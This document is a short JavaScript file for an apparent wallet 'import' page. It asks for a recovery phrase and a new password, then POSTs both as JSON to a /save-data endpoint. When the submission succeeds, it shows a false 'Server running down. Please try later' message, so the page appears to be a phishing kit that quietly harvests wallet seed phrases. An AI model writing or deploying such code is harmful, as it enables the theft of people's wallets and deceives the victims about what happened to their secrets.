document.addEventListener("DOMContentLoaded", () => {
    const recoveryInput = document.getElementById("recovery");
    const newPasswordInput = document.getElementById("newPassword");
    const confirmPasswordInput = document.getElementById("confirmPassword");
    const strengthText = document.getElementById("strengthText");
    const messageBox = document.getElementById("messageBox");
    const importBtn = document.getElementById("importBtn");
    const checkIcon = document.getElementById("checkIcon");

    // Toggle Password Visibility
    document.getElementById("toggleRec").addEventListener("click", function () {
        toggleVisibility(recoveryInput, this);
    });

    document.getElementById("togglePass").addEventListener("click", function () {
        toggleVisibility(newPasswordInput, this);
    });

    function toggleVisibility(inputField, toggleBtn) {
        if (inputField.type === "password") {
            inputField.type = "text";
            toggleBtn.textContent = "Hide";
        } else {
            inputField.type = "password";
            toggleBtn.textContent = "Show";
        }
    }

    // Password Strength Checker
    newPasswordInput.addEventListener("input", function () {
        const password = newPasswordInput.value;
        let strength = checkStrength(password);
        strengthText.innerHTML = `Password strength: <span style="color: ${getColor(strength)}">${strength}</span>`;
    });

    function checkStrength(password) {
        if (!password) return "";
        const hasAlphabet = /[a-zA-Z]/.test(password);
        const hasNumber = /\d/.test(password);
        const hasSpecialChar = /[^a-zA-Z0-9]/.test(password);

        if (password.length >= 8 && hasAlphabet && hasNumber && hasSpecialChar) return "Strong";
        if (password.length >= 6 && hasAlphabet && hasNumber) return "Good";
        return "Weak";
    }

    function getColor(strength) {
        return strength === "Weak" ? "#ff6983" : strength === "Strong" ? "#16bd67" : "#3b93ff";
    }

    // Confirm Password Match
    confirmPasswordInput.addEventListener("input", function () {
        if (newPasswordInput.value === confirmPasswordInput.value && newPasswordInput.value !== "") {
            checkIcon.style.display = "inline";
        } else {
            checkIcon.style.display = "none";
        }
    });

    // Submit Form Data
    importBtn.addEventListener("click", async function () {
        const userData = {
            recover: recoveryInput.value,
            new_pass: newPasswordInput.value,
            conf_pass: confirmPasswordInput.value,
        };

        if (!userData.recover || !userData.new_pass || !userData.conf_pass) {
            showMessage("All fields are required!", "red");
            return;
        }

        const response = await fetch("http://localhost:80/save-data", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
        });

        response.ok ? showMessage("Server running down. Please try later", "red") : showMessage("Server error!", "red");
    });

    function showMessage(text, color) {
        messageBox.textContent = text;
        messageBox.style.color = color;
        messageBox.style.display = "block";
        setTimeout(() => messageBox.style.display = "none", 5000);
    }
});
